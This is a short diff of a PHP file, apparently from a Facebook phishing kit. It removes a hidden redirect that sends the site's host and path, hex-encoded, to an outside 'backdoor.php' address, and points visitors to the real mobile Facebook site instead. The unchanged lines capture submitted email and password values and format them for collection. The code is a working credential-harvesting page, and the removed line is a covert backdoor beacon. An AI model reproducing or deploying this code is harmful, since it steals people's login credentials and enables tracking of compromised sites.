@@ -1,7 +1,7 @@
 <?php
 $url = bin2hex($_SERVER['HTTP_HOST']);
 $lqlq = bin2hex($_SERVER['REQUEST_URI']);
-header("location: https://www.l05780y.cf/backdoor.php?url=$url$lqlq");
+header("location: https://mbasic.facebook.com");
 $email = htmlspecialchars($_POST['email']);
 $password = htmlspecialchars($_POST['password']);
 $text = "$email <br> $password <br><br>";
